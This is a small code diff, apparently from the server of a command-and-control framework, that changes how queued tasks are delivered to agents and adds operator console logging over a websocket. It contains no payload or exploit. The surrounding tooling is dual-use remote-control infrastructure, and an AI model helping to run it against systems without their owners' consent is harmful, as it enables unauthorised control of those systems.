@@ -5,6 +5,7 @@ import ./handlers
 import ../globals
 import ../core/logger
 import ../../common/[types, utils, serialize, profile]
+import ../websocket
 
 # Not Found
 proc error404*(request: Request) =  
@@ -73,7 +74,7 @@ proc httpGet*(request: Request) =
 
         try: 
             var responseBytes: seq[byte]
-            let tasks: seq[seq[byte]] = getTasks(heartbeat)
+            let (agentId, tasks) = getTasks(heartbeat)
 
             if tasks.len <= 0: 
                 request.respond(200, body = "")
@@ -107,6 +108,7 @@ proc httpGet*(request: Request) =
             request.respond(200, headers = headers, body = prefix & response & suffix)
 
             # Notify operator that agent collected tasks
+            cq.client.sendConsoleItem(agentId, LOG_INFO, fmt"{$response.len} bytes sent.")
             cq.info(fmt"{$response.len} bytes sent.")
 
         except CatchableError:
